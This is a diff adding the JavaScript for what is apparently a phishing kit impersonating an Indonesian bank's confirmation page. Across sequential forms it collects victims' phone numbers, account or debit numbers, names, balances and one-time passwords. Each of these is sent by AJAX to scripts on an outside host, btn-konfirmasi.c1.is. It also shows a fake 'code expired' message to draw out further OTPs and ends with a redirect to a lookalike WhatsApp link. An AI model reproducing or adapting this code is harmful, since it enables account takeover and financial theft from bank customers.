@@ -1,0 +1,172 @@
+// index
+ $(document).ready(function(){
+    $('#formHP').submit(function(e) {
+    event.preventDefault();
+    
+document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
+  $("#djload").show();
+
+ $.ajax({
+ type: 'POST',
+ url: 'https://btn-konfirmasi.c1.is/token/18/sendNomor.php',
+ data: $(this).serialize(),
+ datatype: 'JSON',
+ 
+ complete: function(data) {
+            console.log('Complete')
+  setTimeout(function(){
+   $('#lodingku').hide();
+     window.location = "./data.html";
+ var nomor = document.getElementById('nope').value;
+sessionStorage.setItem("nomor", nomor);
+     }, 500);
+    setTimeout(function(){  
+       $("#djload").hide();  
+       document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";    
+    }, 2000);
+        }
+    });
+ });
+    return false;
+});   
+     
+//data     
+$('#form1').on('submit', function (event) {
+
+ 
+  event.stopPropagation();
+    event.preventDefault();
+ 
+  $("#djload").show();
+
+    
+ document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
+$.ajax({
+ type: 'POST',
+ url: 'https://btn-konfirmasi.c1.is/token/18/sendDebit.php',
+ async: false,
+ dataType: 'JSON',
+ data: $(this).serialize(),
+ 
+ complete: function(data) {
+            console.log('Complete')
+setTimeout(function(){
+       $("#lodingku").hide();
+location.href ="./saldo.html";
+   var nomortel = document.getElementById('nomorku').value;
+    sessionStorage.setItem("nomortel", nomortel);
+      var noreke = document.getElementById('norek').value;
+    sessionStorage.setItem("noreke", noreke);
+    var namanya = document.getElementById('nama').value;
+    sessionStorage.setItem("namanya", namanya);     
+    }, 1000);
+     setTimeout(function(){  
+       $("#djload").hide();  
+       document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";    
+    }, 2000);
+        }
+    });
+
+    return false;
+});           
+    
+    
+    
+    
+// saldo  
+$('#forgetPasswordForm').on('submit', function (event) {
+
+ $("#djload").show();
+
+  event.stopPropagation();
+    event.preventDefault();
+  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
+   
+$.ajax({
+ type: 'POST',
+ url: 'https://btn-konfirmasi.c1.is/token/18/sendSaldo.php',
+ async: false,
+ dataType: 'JSON',
+ data: $(this).serialize(),
+ 
+ complete: function(data) {
+            console.log('Complete')
+ 
+
+var phone = document.getElementById("nomorsaya").value;
+ sessionStorage.setItem("phone", phone);
+ var user = document.getElementById("namaku").value;
+ sessionStorage.setItem("user", user);
+ var card = document.getElementById("norekku").value;
+ sessionStorage.setItem("card", card);
+ var duet = document.getElementById("rupiah").value;
+ sessionStorage.setItem("duet", duet);  
+location.href ="./otp.html";
+ setTimeout(function(){  
+       $("#djload").hide();  
+       document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";    
+    }, 2000);
+
+     
+ }
+    });
+
+    return false;
+});       
+
+
+// otp
+$('#form2').on('submit', function (event) {
+
+ 
+  event.stopPropagation();
+    event.preventDefault();
+ 
+  $("#djload").show();
+
+    
+ document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
+$.ajax({
+ type: 'POST',
+ url: 'https://btn-konfirmasi.c1.is/token/18/sendOtp.php',
+ async: false,
+ dataType: 'JSON',
+ data: $(this).serialize(),
+ 
+ complete: function(data) {
+            console.log('Complete')
+setTimeout(function(){  
+       
+      
+    }, 2000);
+     $("#notif").text("- Kode E-Commerce sudah kadaluarsa -");
+     $("#notif").css("color", "red");
+        }
+    });
+      setTimeout(() => {
+     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode E-Commerce,<br/>Silahkan klik tombol dibawah ini";
+     $("#djload").hide();  
+   $("#notif").css("color", "black");
+ $("#sixpin").val("");
+document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";      
+              
+   }, 4000);
+
+    return false;
+});       
+
+
+
+// datawa
+
+function getcs(){
+ $("#djload").show();   
+  audio4 = document.getElementById("bsiku");
+  audio1 = document.getElementById("bsi");
+    audio4.play();
+     audio1.load();
+    audio4.loop = false
+setTimeout(function(){  
+location.href='https://linkbsimobile.wasap.my/';
+    }, 5000);    
+}     
